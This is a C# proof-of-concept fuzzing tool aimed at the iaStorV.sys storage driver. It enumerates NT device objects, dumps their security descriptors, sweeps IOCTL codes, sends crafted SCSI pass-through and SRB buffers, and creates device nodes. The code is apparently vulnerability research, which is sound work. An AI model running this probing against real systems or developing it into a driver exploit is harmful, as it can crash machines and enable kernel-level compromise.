// t10 fuzz PoC for iaStorV.sys - raw NTSTATUS device probes + shaped SCSI pass-through structs
// subcommands (argv[1]=outfile first):
//   qobj <ntdir> <filterRegex>
//   open <winpath> [accHex] [shareHex]
//   ntopen <ntpath> [accHex]
//   dacl <winpath>
//   daclnt <ntpath>
//   ioctl <winpath> <codeHex> <inlenHex> <outlenHex> [inhex]
//   stptd <winpath> <codeHex> <sil> <sioff> <datain> <dtl> [cdbhex]
//   stpt <winpath> <codeHex> <datain> <dboff> <dtl> [cdbhex]
//   srb <winpath> <codeHex> <sig> <ccHex> [lenHex]
//   mkdev <devid> <parent>
//   devstat <devid>
// shaped struct layouts used (x64, from WDK 10.0.26100 ntddscsi.h):
//   SCSI_PASS_THROUGH_DIRECT: Length@0 ScsiStatus@2 PathId@3 TargetId@4 Lun@5 CdbLength@6
//     SenseInfoLength@7 DataIn@8 DataTransferLength@C TimeOutValue@10 DataBuffer@18
//     SenseInfoOffset@20 Cdb[16]@24  (header size 0x34)
//   SCSI_PASS_THROUGH: same through TimeOutValue@10; DataBufferOffset(ULONG_PTR)@18
//     SenseInfoOffset@20 Cdb[16]@24  (header size 0x34)
//   driver sense convention observed: sense area expected at SystemBuffer+0x38 (Information=0x38+SenseInfoLength)
//   SRB_IO_CONTROL: HeaderLength@0 Signature[8]@4 Timeout@C ControlCode@10 ReturnCode@14 Length@18 Data@1C
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;

class T10 {
  [StructLayout(LayoutKind.Sequential)]
  struct IO_STATUS_BLOCK { public IntPtr Status; public IntPtr Information; }

  [StructLayout(LayoutKind.Sequential)]
  struct UNICODE_STRING { public ushort Len; public ushort MaxLen; public IntPtr Buffer; }

  [StructLayout(LayoutKind.Sequential)]
  struct OBJECT_ATTRIBUTES {
    public uint Length; public uint pad;
    public IntPtr RootDirectory; public IntPtr ObjectName;
    public uint Attributes; public uint pad2; public IntPtr SD; public IntPtr SQOS;
  }

  [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
  static extern IntPtr CreateFileW(string name, uint access, uint share, IntPtr sa, uint disp, uint flags, IntPtr tmpl);
  [DllImport("kernel32.dll", SetLastError = true)]
  static extern bool CloseHandle(IntPtr h);
  [DllImport("advapi32.dll", SetLastError = true)]
  static extern bool GetKernelObjectSecurity(IntPtr h, uint info, IntPtr sd, uint sdLen, out uint sdNeed);
  [DllImport("advapi32.dll", CharSet = CharSet.Unicode)]
  static extern int ConvertSecurityDescriptorToStringSecurityDescriptorW(IntPtr sd, uint rev, uint info, out IntPtr str, out uint strLen);

  [DllImport("ntdll.dll")]
  static extern int NtDeviceIoControlFile(IntPtr h, IntPtr ev, IntPtr apcRoutine, IntPtr apcCtx, ref IO_STATUS_BLOCK iosb, uint code, IntPtr inBuf, uint inLen, IntPtr outBuf, uint outLen);
  [DllImport("ntdll.dll")]
  static extern int NtCreateFile(out IntPtr h, uint access, ref OBJECT_ATTRIBUTES attr, ref IO_STATUS_BLOCK iosb, IntPtr alloc, uint fattr, uint share, uint disp, uint opts, IntPtr ea, uint ealen);
  [DllImport("ntdll.dll")]
  static extern int NtOpenDirectoryObject(out IntPtr h, uint access, ref OBJECT_ATTRIBUTES attr);
  [DllImport("ntdll.dll")]
  static extern int NtQueryDirectoryObject(IntPtr h, IntPtr buf, uint len, bool single, bool restart, ref uint ctx, out uint ret);

  [DllImport("cfgmgr32.dll", CharSet = CharSet.Unicode)]
  static extern int CM_Locate_DevNodeW(out uint devinst, string deviceId, uint flags);
  [DllImport("cfgmgr32.dll", CharSet = CharSet.Unicode)]
  static extern int CM_Create_DevNodeW(out uint devinst, string deviceId, uint parent, uint flags);
  [DllImport("cfgmgr32.dll")]
  static extern int CM_Get_DevNode_Status(out uint status, out uint problem, uint devinst, uint flags);

  static string OUT;
  static object lck = new object();
  static void Log(string s) { lock (lck) { File.AppendAllText(OUT, s + "\r\n"); } }
  static void H(string s) { Log("== " + s); }

  static IntPtr OpenDevWin(string path, uint acc, uint share) {
    return CreateFileW(path, acc, share, IntPtr.Zero, 3, 0, IntPtr.Zero); // OPEN_EXISTING
  }

  static string ErrOf(IntPtr h) {
    if (h == new IntPtr(-1) || h == new IntPtr(-2)) return "FAIL err=" + Marshal.GetLastWin32Error();
    return "OK handle=0x" + h.ToInt64().ToString("X");
  }

  static string HexOf(IntPtr buf, uint n) {
    if (n > 64) n = 64;
    StringBuilder sb = new StringBuilder();
    for (uint i = 0; i < n; i++) sb.Append(Marshal.ReadByte(buf, (int)i).ToString("x2"));
    bool sentinel = true;
    for (uint i = 0; i < n; i++) if (Marshal.ReadByte(buf, (int)i) != 0xEE) { sentinel = false; break; }
    return sb.ToString() + (n > 0 && sentinel ? " [all-sentinel]" : " [DATA]");
  }

  static IntPtr OpenCtl(string path) {
    IntPtr h = OpenDevWin(path, 0x12019F, 3); // GR|GW-ish control open
    if (h == new IntPtr(-1) || h == new IntPtr(-2)) {
      Log("open " + path + " err=" + Marshal.GetLastWin32Error() + " (access 0x12019F)");
      return IntPtr.Zero;
    }
    return h;
  }

  // ---------- inventory (v2: batch read + UCS-2 string extraction from the buffer;
  // the entries' Buffer fields can be kernel VAs - t7 lesson - so parse names from raw bytes) ----------
  static void CmdQobj(string dir, string filter) {
    IntPtr h;
    OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();
    oa.Length = (uint)Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES));
    oa.Attributes = 0x40; // OBJ_CASE_INSENSITIVE
    UNICODE_STRING us = new UNICODE_STRING();
    us.Len = (ushort)(dir.Length * 2); us.MaxLen = (ushort)((dir.Length + 1) * 2);
    us.Buffer = Marshal.StringToHGlobalUni(dir);
    IntPtr pUS = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(UNICODE_STRING)));
    Marshal.StructureToPtr(us, pUS, false);
    oa.ObjectName = pUS;
    int st = NtOpenDirectoryObject(out h, 0x1 | 0x8, ref oa); // QUERY|TRAVERSE
    if (st != 0) { Log("qobj " + dir + " open st=0x" + st.ToString("X8")); return; }
    IntPtr buf = Marshal.AllocHGlobal(65536);
    uint ctx = 0, ret; bool first = true; Regex rx = new Regex(filter, RegexOptions.IgnoreCase);
    while (true) {
      st = NtQueryDirectoryObject(h, buf, 65536, false, first, ref ctx, out ret); // batch mode
      first = false;
      if (ret > 0 && ret < 2048) {
        for (uint i = 0; i < ret; i++) {
          string n; string t;
          USAt(buf, (int)(i * 32), out n);
          USAt(buf, (int)(i * 32 + 16), out t);
          if (rx.IsMatch(n)) Log(string.Format("{0} -> {1} [{2}]", dir, n, t));
        }
      }
      if (st != 0) break;
    }
    // raw UCS-2 string extraction from the buffer contents (pointer-independent)
    StringBuilder sb = new StringBuilder();
    for (int i = 0; i < 32760; i++) {
      ushort c = (ushort)Marshal.ReadInt16(buf, i * 2);
      if (c >= 0x20 && c <= 0x7E) { sb.Append((char)c); }
      else {
        if (sb.Length >= 3) {
          string s2 = sb.ToString();
          if (rx.IsMatch(s2)) Log(string.Format("{0} -> RAWSTR '{1}'", dir, s2));
        }
        sb.Length = 0;
      }
    }
    if (sb.Length >= 3) Log(string.Format("{0} -> RAWSTR '{1}' (tail)", dir, sb.ToString()));
    Log("qobj " + dir + " scan complete (st=0x" + st.ToString("X8") + ")");
  }

  static void USAt(IntPtr baseP, int off, out string s) {
    ushort len = (ushort)Marshal.ReadInt16(baseP, off);
    IntPtr b = Marshal.ReadIntPtr(baseP, off + 8);
    // t10 fix (t7 lesson): returned name buffers can be kernel VAs -> never deref them
    long v = b.ToInt64();
    if (len == 0 || b == IntPtr.Zero || v < 0x10000 || v > 0x7FFFFFFEFFFF) {
      s = (len > 0) ? ("[unreadable-kern-ptr len=" + len + "]") : "";
      return;
    }
    string raw = Marshal.PtrToStringUni(b, len / 2);
    StringBuilder sbq = new StringBuilder();
    foreach (char ch in raw) { sbq.Append((ch >= 0x20 && ch <= 0x7E) ? ch : '?'); }
    s = sbq.ToString();
  }

  static void CmdOpen(string path, uint acc, uint share) {
    IntPtr h = OpenDevWin(path, acc, share);
    Log(string.Format("open {0} acc=0x{1:X} share=0x{2:X} -> {3}", path, acc, share, ErrOf(h)));
    if (h != new IntPtr(-1) && h != new IntPtr(-2)) CloseHandle(h);
  }

  static void CmdNtOpen(string path, uint acc) {
    OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();
    oa.Length = (uint)Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES));
    oa.Attributes = 0x40;
    UNICODE_STRING us = new UNICODE_STRING();
    us.Len = (ushort)(path.Length * 2); us.MaxLen = (ushort)((path.Length + 1) * 2);
    us.Buffer = Marshal.StringToHGlobalUni(path);
    IntPtr pUS = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(UNICODE_STRING)));
    Marshal.StructureToPtr(us, pUS, false);
    oa.ObjectName = pUS;
    IO_STATUS_BLOCK iosb = new IO_STATUS_BLOCK();
    IntPtr h;
    int st = NtCreateFile(out h, acc, ref oa, ref iosb, IntPtr.Zero, 0, 3, 1, 0, IntPtr.Zero, 0);
    Log(string.Format("ntopen {0} acc=0x{1:X} -> st=0x{2:X8}", path, acc, st));
    if (st == 0) CloseHandle(h);
  }

  static void CmdOpenLink(string path) {
    OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();
    oa.Length = (uint)Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES));
    oa.Attributes = 0x40 | 0x100; // OBJ_CASE_INSENSITIVE | OBJ_OPENLINK (do not follow)
    UNICODE_STRING us = new UNICODE_STRING();
    us.Len = (ushort)(path.Length * 2); us.MaxLen = (ushort)((path.Length + 1) * 2);
    us.Buffer = Marshal.StringToHGlobalUni(path);
    IntPtr pUS = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(UNICODE_STRING)));
    Marshal.StructureToPtr(us, pUS, false);
    oa.ObjectName = pUS;
    IO_STATUS_BLOCK iosb = new IO_STATUS_BLOCK();
    IntPtr h;
    int st = NtCreateFile(out h, 0, ref oa, ref iosb, IntPtr.Zero, 0, 0, 1, 0, IntPtr.Zero, 0);
    Log(string.Format("openlink {0} -> st=0x{1:X8}", path, st));
    if (st == 0) CloseHandle(h);
  }

  static void DaclOf(IntPtr h, string label) {
    IntPtr sd = Marshal.AllocHGlobal(8192); uint need;
    if (!GetKernelObjectSecurity(h, 0x7, sd, 8192, out need)) {
      Log("dacl " + label + " GetKernelObjectSecurity err=" + Marshal.GetLastWin32Error());
    } else {
      IntPtr sddl; uint sddlLen;
      int rc = ConvertSecurityDescriptorToStringSecurityDescriptorW(sd, 1, 0x7, out sddl, out sddlLen);
      if (rc != 0) Log("dacl " + label + " SDDL=" + Marshal.PtrToStringUni(sddl));
      else Log("dacl " + label + " convert err=" + Marshal.GetLastWin32Error());
    }
    CloseHandle(h);
  }

  static void CmdDacl(string path) {
    IntPtr h = OpenDevWin(path, 0x00020000, 3); // READ_CONTROL
    if (h == new IntPtr(-1) || h == new IntPtr(-2)) {
      Log("dacl " + path + " open err=" + Marshal.GetLastWin32Error() + " (READ_CONTROL)");
      return;
    }
    DaclOf(h, path);
  }

  static void CmdDaclNt(string path) {
    OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();
    oa.Length = (uint)Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES));
    oa.Attributes = 0x40;
    UNICODE_STRING us = new UNICODE_STRING();
    us.Len = (ushort)(path.Length * 2); us.MaxLen = (ushort)((path.Length + 1) * 2);
    us.Buffer = Marshal.StringToHGlobalUni(path);
    IntPtr pUS = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(UNICODE_STRING)));
    Marshal.StructureToPtr(us, pUS, false);
    oa.ObjectName = pUS;
    IO_STATUS_BLOCK iosb = new IO_STATUS_BLOCK();
    IntPtr h;
    int st = NtCreateFile(out h, 0x00020000, ref oa, ref iosb, IntPtr.Zero, 0, 3, 1, 0, IntPtr.Zero, 0);
    if (st != 0) { Log("daclnt " + path + " NtCreateFile st=0x" + st.ToString("X8")); return; }
    DaclOf(h, path);
  }

  // ---------- raw ioctl ----------
  static void CmdIoctl(string path, uint code, uint inLen, uint outLen, byte[] inBytes) {
    IntPtr h = OpenCtl(path);
    if (h == IntPtr.Zero) return;
    IntPtr inBuf = Marshal.AllocHGlobal((int)inLen + 1);
    IntPtr outBuf = Marshal.AllocHGlobal((int)outLen);
    for (uint i = 0; i < inLen; i++) Marshal.WriteByte(inBuf, (int)i, (i < inBytes.Length) ? inBytes[i] : (byte)0);
    for (uint i = 0; i < outLen; i++) Marshal.WriteByte(outBuf, (int)i, 0xEE);
    IO_STATUS_BLOCK iosb = new IO_STATUS_BLOCK();
    int st = NtDeviceIoControlFile(h, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref iosb, code, inBuf, inLen, outBuf, outLen);
    uint info = (uint)iosb.Information.ToInt64();
    Log(string.Format("ioctl {0} code=0x{1:X8} in={2} out=0x{3:X} -> st=0x{4:X8} ret={5}", path, code, inLen, outLen, st, info));
    if (info > 0) Log("   out[0.." + Math.Min(info, 64) + "] = " + HexOf(outBuf, info));
    Marshal.FreeHGlobal(inBuf); Marshal.FreeHGlobal(outBuf); CloseHandle(h);
  }

  // ---------- shaped SCSI_PASS_THROUGH_DIRECT (x64, 0x34 header + 16 B sense area @0x38) ----------
  static void CmdStptd(string path, uint code, uint sil, uint sioff, uint datain, uint dtl, byte[] cdb) {
    if (cdb.Length == 0) cdb = new byte[] { 0x00 }; // TEST UNIT READY default (CdbLength must be nonzero)
    if (cdb.Length > 16) cdb = Slice(cdb, 16);
    const uint TOTAL = 0x48; // 0x34 header + 16 B sense area at 0x38
    IntPtr h = OpenCtl(path);
    if (h == IntPtr.Zero) return;
    IntPtr inBuf = Marshal.AllocHGlobal((int)TOTAL);
    for (uint i = 0; i < TOTAL; i++) Marshal.WriteByte(inBuf, (int)i, 0);
    // sense area sentinel 0xEE at +0x38.. so an in-bounds driver zero-fill is visible
    for (uint i = 0x38; i < TOTAL; i++) Marshal.WriteByte(inBuf, (int)i, 0xEE);
    Marshal.WriteInt16(inBuf, 0x00, (short)0x38);          // Length >= 0x38 (native path)
    Marshal.WriteByte(inBuf, 0x02, 0);                    // ScsiStatus
    Marshal.WriteByte(inBuf, 0x03, 0);                    // PathId
    Marshal.WriteByte(inBuf, 0x04, 0);                    // TargetId
    Marshal.WriteByte(inBuf, 0x05, 0);                    // Lun
    Marshal.WriteByte(inBuf, 0x06, (byte)cdb.Length);     // CdbLength (must be nonzero)
    Marshal.WriteByte(inBuf, 0x07, (byte)sil);            // SenseInfoLength
    Marshal.WriteInt32(inBuf, 0x08, (int)datain);         // DataIn
    Marshal.WriteInt32(inBuf, 0x0C, (int)dtl);            // DataTransferLength
    Marshal.WriteInt32(inBuf, 0x10, 10);                  // TimeOutValue (s)
    Marshal.WriteIntPtr(inBuf, 0x18, IntPtr.Zero);        // DataBuffer (PVOID; DIRECT uses MDL plane)
    Marshal.WriteInt32(inBuf, 0x20, (int)sioff);          // SenseInfoOffset
    for (int i = 0; i < cdb.Length; i++) Marshal.WriteByte(inBuf, 0x24 + i, cdb[i]);
    byte[] before = ReadBytes(inBuf, TOTAL);
    IO_STATUS_BLOCK iosb = new IO_STATUS_BLOCK();
    int st = NtDeviceIoControlFile(h, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref iosb, code, inBuf, TOTAL, inBuf, TOTAL);
    uint info = (uint)iosb.Information.ToInt64();
    byte[] after = ReadBytes(inBuf, TOTAL);
    Log(string.Format("stptd {0} code=0x{1:X8} sil={2} sioff=0x{3:X} datain={4} dtl={5} -> st=0x{6:X8} ret={7}",
      path, code, sil, sioff, datain, dtl, st, info));
    DumpDelta(before, after, TOTAL);
    Marshal.FreeHGlobal(inBuf);
    CloseHandle(h);
  }

  // ---------- shaped SCSI_PASS_THROUGH (x64; DataBufferOffset in-bounds small value) ----------
  static void CmdStpt(string path, uint code, uint datain, ulong dboff, uint dtl, byte[] cdb) {
    if (cdb.Length == 0) cdb = new byte[] { 0x28 }; // READ(10) default for the 0x4D004 CDB-0x28 sink
    if (cdb.Length > 16) cdb = Slice(cdb, 16);
    const uint TOTAL = 0x48;
    IntPtr h = OpenCtl(path);
    if (h == IntPtr.Zero) return;
    IntPtr inBuf = Marshal.AllocHGlobal((int)TOTAL);
    for (uint i = 0; i < TOTAL; i++) Marshal.WriteByte(inBuf, (int)i, 0);
    for (uint i = 0x38; i < TOTAL; i++) Marshal.WriteByte(inBuf, (int)i, 0xEE);
    Marshal.WriteInt16(inBuf, 0x00, (short)0x38);
    Marshal.WriteByte(inBuf, 0x03, 0);                    // PathId
    Marshal.WriteByte(inBuf, 0x06, (byte)cdb.Length);     // CdbLength
    Marshal.WriteByte(inBuf, 0x07, 0);                    // SenseInfoLength = 0 (no sense fill in this mode)
    Marshal.WriteInt32(inBuf, 0x08, (int)datain);         // DataIn
    Marshal.WriteInt32(inBuf, 0x0C, (int)dtl);            // DataTransferLength
    Marshal.WriteInt32(inBuf, 0x10, 10);                  // TimeOutValue
    Marshal.WriteInt64(inBuf, 0x18, (long)dboff);         // DataBufferOffset (ULONG_PTR) - in-bounds only
    Marshal.WriteInt32(inBuf, 0x20, 0x38);                // SenseInfoOffset (0-length sense)
    for (int i = 0; i < cdb.Length; i++) Marshal.WriteByte(inBuf, 0x24 + i, cdb[i]);
    byte[] before = ReadBytes(inBuf, TOTAL);
    IO_STATUS_BLOCK iosb = new IO_STATUS_BLOCK();
    int st = NtDeviceIoControlFile(h, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref iosb, code, inBuf, TOTAL, inBuf, TOTAL);
    uint info = (uint)iosb.Information.ToInt64();
    byte[] after = ReadBytes(inBuf, TOTAL);
    Log(string.Format("stpt {0} code=0x{1:X8} datain={2} dboff=0x{3:X} dtl={4} -> st=0x{5:X8} ret={6}",
      path, code, datain, dboff, dtl, st, info));
    DumpDelta(before, after, TOTAL);
    Marshal.FreeHGlobal(inBuf);
    CloseHandle(h);
  }

  // ---------- SRB_IO_CONTROL shape for 0x4D008 ----------
  static void CmdSrb(string path, uint code, string sig, uint cc, uint dlen) {
    const uint TOTAL = 0x50;
    IntPtr h = OpenCtl(path);
    if (h == IntPtr.Zero) return;
    IntPtr inBuf = Marshal.AllocHGlobal((int)TOTAL);
    for (uint i = 0; i < TOTAL; i++) Marshal.WriteByte(inBuf, (int)i, 0);
    Marshal.WriteInt32(inBuf, 0x00, 0x1C);                // HeaderLength
    byte[] sb = Encoding.ASCII.GetBytes((sig.Length > 8 ? sig.Substring(0, 8) : sig));
    for (int i = 0; i < sb.Length; i++) Marshal.WriteByte(inBuf, 0x04 + i, sb[i]);
    Marshal.WriteInt32(inBuf, 0x0C, 10);                  // Timeout
    Marshal.WriteInt32(inBuf, 0x10, (int)cc);             // ControlCode
    Marshal.WriteInt32(inBuf, 0x14, 0);                   // ReturnCode
    Marshal.WriteInt32(inBuf, 0x18, (int)dlen);           // Length
    IO_STATUS_BLOCK iosb = new IO_STATUS_BLOCK();
    int st = NtDeviceIoControlFile(h, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref iosb, code, inBuf, TOTAL, inBuf, TOTAL);
    uint info = (uint)iosb.Information.ToInt64();
    Log(string.Format("srb {0} code=0x{1:X8} sig='{2}' cc=0x{3:X} len={4} -> st=0x{5:X8} ret={6}",
      path, code, sig, cc, dlen, st, info));
    if (info > 0) Log("   out[0.." + Math.Min(info, 64) + "] = " + HexOf(inBuf, info));
    Marshal.FreeHGlobal(inBuf);
    CloseHandle(h);
  }

  static byte[] ReadBytes(IntPtr p, uint n) {
    byte[] b = new byte[n];
    for (uint i = 0; i < n; i++) b[i] = Marshal.ReadByte(p, (int)i);
    return b;
  }

  static void DumpDelta(byte[] before, byte[] after, uint n) {
    StringBuilder sb = new StringBuilder();
    bool any = false;
    for (uint i = 0; i < n; i++) if (before[i] != after[i]) { any = true; break; }
    if (!any) { Log("   buffer unchanged"); return; }
    for (uint i = 0; i < n; i += 16) {
      bool row = false;
      for (uint j = i; j < i + 16 && j < n; j++) if (before[j] != after[j]) { row = true; break; }
      if (!row) continue;
      sb.Length = 0;
      sb.Append("   +0x").Append(i.ToString("X2")).Append(": ");
      for (uint j = i; j < i + 16 && j < n; j++) {
        if (before[j] != after[j]) sb.Append(before[j].ToString("x2")).Append("->").Append(after[j].ToString("x2")).Append(' ');
        else sb.Append(".. ");
      }
      Log(sb.ToString());
    }
  }

  static byte[] Slice(byte[] b, int n) {
    byte[] o = new byte[n];
    Array.Copy(b, o, Math.Min(n, b.Length));
    return o;
  }

  static byte[] HexToBytes(string h) {
    if (h.Length % 2 != 0) h = "0" + h;
    byte[] b = new byte[h.Length / 2];
    for (int i = 0; i < b.Length; i++) b[i] = Convert.ToByte(h.Substring(i * 2, 2), 16);
    return b;
  }

  // ---------- devnode helpers (t1/t3/t6 recipe) ----------
  static void CmdMkDev(string devid, string parent) {
    uint pdn, cdn;
    int cr = CM_Locate_DevNodeW(out pdn, parent, 0);
    if (cr != 0) { Log("mkdev " + devid + " parent-locate " + parent + " CR=0x" + cr.ToString("X")); return; }
    cr = CM_Create_DevNodeW(out cdn, devid, pdn, 0);
    if (cr == 0) {
      uint st, pr;
      int cr2 = CM_Get_DevNode_Status(out st, out pr, cdn, 0);
      Log(string.Format("mkdev {0} parent={1} CR=0 dn=0x{2:X} status=0x{3:X} problem={4} (statCR=0x{5:X})",
        devid, parent, cdn, cr2 == 0 ? st : 0, cr2 == 0 ? pr : 0, cr2));
    } else {
      Log("mkdev " + devid + " parent=" + parent + " CR=0x" + cr.ToString("X"));
    }
  }

  static void CmdDevStat(string devid) {
    uint dn, st, pr;
    int cr = CM_Locate_DevNodeW(out dn, devid, 0);
    if (cr != 0) { Log("devstat " + devid + " locate CR=0x" + cr.ToString("X")); return; }
    cr = CM_Get_DevNode_Status(out st, out pr, dn, 0);
    Log(string.Format("devstat {0} dn=0x{1:X} CR=0x{2:X} status=0x{3:X} problem={4}", devid, dn, cr, st, pr));
  }

  // ---------- raw code sweep (explicit codes, step parameter) ----------
  static void CmdSweepC(string path, uint codeStart, uint codeEnd, uint step, uint inLen, uint outLen) {
    IntPtr h = OpenCtl(path);
    if (h == IntPtr.Zero) return;
    IntPtr inBuf = Marshal.AllocHGlobal((int)inLen);
    IntPtr outBuf = Marshal.AllocHGlobal((int)outLen);
    for (uint i = 0; i < inLen; i++) Marshal.WriteByte(inBuf, (int)i, 0);
    IO_STATUS_BLOCK iosb = new IO_STATUS_BLOCK();
    for (uint code = codeStart; ; code += step) {
      for (uint i = 0; i < outLen; i++) Marshal.WriteByte(outBuf, (int)i, 0xEE);
      iosb = new IO_STATUS_BLOCK();
      int st = NtDeviceIoControlFile(h, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref iosb, code, inBuf, inLen, outBuf, outLen);
      uint info = (uint)iosb.Information.ToInt64();
      StringBuilder sb = new StringBuilder();
      sb.AppendFormat("code=0x{0:X8} st=0x{1:X8} ret={2}", code, st, info);
      if (info > 0 && info <= outLen) sb.Append(" out=" + HexOf(outBuf, info));
      Log(sb.ToString());
      if (code > codeEnd - step) break; // avoids wrap at 0xFFFFFFFF
    }
    Log(string.Format("sweepc {0} codes 0x{1:X8}..0x{2:X8} step 0x{3:X} COMPLETE", path, codeStart, codeEnd, step));
    Marshal.FreeHGlobal(inBuf); Marshal.FreeHGlobal(outBuf); CloseHandle(h);
  }

  static void Main(string[] args) {
    OUT = args[0];
    Log("t10_poc start " + DateTime.Now.ToString("o"));
    try {
      string cmd = args.Length > 1 ? args[1] : "";
      if (cmd == "qobj") { CmdQobj(args[2], args[3]); }
      else if (cmd == "open") {
        uint acc = args.Length > 3 ? Convert.ToUInt32(args[3], 16) : 0x12019F;
        uint sh = args.Length > 4 ? Convert.ToUInt32(args[4], 16) : 3;
        CmdOpen(args[2], acc, sh);
      } else if (cmd == "ntopen") {
        uint acc = args.Length > 3 ? Convert.ToUInt32(args[3], 16) : 0x12019F;
        CmdNtOpen(args[2], acc);
      } else if (cmd == "openlink") { CmdOpenLink(args[2]); } else if (cmd == "dacl") { CmdDacl(args[2]); }
      else if (cmd == "daclnt") { CmdDaclNt(args[2]); }
      else if (cmd == "ioctl") {
        uint code = Convert.ToUInt32(args[3], 16);
        uint inLen = Convert.ToUInt32(args[4], 16);
        uint outLen = Convert.ToUInt32(args[5], 16);
        byte[] inb = args.Length > 6 ? HexToBytes(args[6]) : new byte[0];
        CmdIoctl(args[2], code, inLen, outLen, inb);
      } else if (cmd == "stptd") {
        // stptd <out> <path> <code> <sil> <sioff> <datain> <dtl> [cdbhex]
        uint code = Convert.ToUInt32(args[3], 16);
        uint sil = Convert.ToUInt32(args[4], 16);
        uint sioff = Convert.ToUInt32(args[5], 16);
        uint di = Convert.ToUInt32(args[6], 16);
        uint dtl = Convert.ToUInt32(args[7], 16);
        byte[] cdb = args.Length > 8 ? HexToBytes(args[8]) : new byte[0];
        CmdStptd(args[2], code, sil, sioff, di, dtl, cdb);
      } else if (cmd == "stpt") {
        // stpt <out> <path> <code> <datain> <dboff> <dtl> [cdbhex]
        uint code = Convert.ToUInt32(args[3], 16);
        uint di = Convert.ToUInt32(args[4], 16);
        ulong dboff = Convert.ToUInt64(args[5], 16);
        uint dtl = Convert.ToUInt32(args[6], 16);
        byte[] cdb = args.Length > 7 ? HexToBytes(args[7]) : new byte[0];
        CmdStpt(args[2], code, di, dboff, dtl, cdb);
      } else if (cmd == "srb") {
        // srb <out> <path> <code> <sig> <ccHex> [lenHex]
        uint code = Convert.ToUInt32(args[3], 16);
        string sig = args[4];
        uint cc = Convert.ToUInt32(args[5], 16);
        uint dl = args.Length > 6 ? Convert.ToUInt32(args[6], 16) : 0u;
        CmdSrb(args[2], code, sig, cc, dl);
      } else if (cmd == "sweepc") {
        // sweepc <out> <path> <startHex> <endHex> <stepHex> [inlenHex] [outlenHex]
        uint s = Convert.ToUInt32(args[3], 16);
        uint e = Convert.ToUInt32(args[4], 16);
        uint st2 = args.Length > 5 ? Convert.ToUInt32(args[5], 16) : 4u;
        uint il = args.Length > 6 ? Convert.ToUInt32(args[6], 16) : 16u;
        uint ol = args.Length > 7 ? Convert.ToUInt32(args[7], 16) : 0x1000u;
        CmdSweepC(args[2], s, e, st2, il, ol);
      } else if (cmd == "mkdev") { CmdMkDev(args[2], args[3]); }
      else if (cmd == "devstat") { CmdDevStat(args[2]); }
      else Log("unknown cmd: " + cmd);
    } catch (Exception e) {
      Log("EXCEPTION: " + e.GetType().Name + ": " + e.Message);
    }
    Log("t10_poc end " + DateTime.Now.ToString("o"));
  }
}
